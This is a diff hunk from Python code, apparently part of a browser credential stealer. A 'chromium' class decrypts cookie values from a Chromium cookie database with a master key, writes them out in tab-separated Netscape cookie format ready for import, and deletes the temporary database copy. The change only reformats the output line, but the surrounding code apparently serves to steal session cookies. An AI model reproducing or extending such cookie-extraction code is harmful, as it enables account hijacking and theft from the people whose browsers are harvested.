@@ -170,8 +170,8 @@ class chromium():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
                 if host_key != "" and name != "" and value != "":
-                    f.write("{} {} {} {} {} {} {}\n".format(
-                        host_key, 'FALSE' if host_key.startswith('.') else 'TRUE', path, 'FALSE' if expires_utc == 0 else 'TRUE', expires_utc, name, value))
+                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
         cursor.close()
         conn.close()
         os.remove(vault)
